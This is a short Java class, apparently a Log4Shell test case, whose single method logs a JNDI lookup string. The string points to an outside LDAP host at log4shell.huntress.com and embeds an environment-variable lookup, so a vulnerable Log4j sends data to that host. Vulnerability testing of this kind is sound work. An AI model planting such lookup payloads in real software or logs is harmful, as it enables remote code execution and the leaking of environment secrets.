package com.log4jshell;

import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;

public class DependencyApp {

    private static final Logger logger = LogManager.getLogger(DependencyApp.class);

    public static void runTheLog() {
        logger.info("${jndi:ldap://log4shell.huntress.com:1389/dependency=${env:dependencyName}/da4b0d7c-ddf4-4430-930b-3df93660840d}");
    }
}
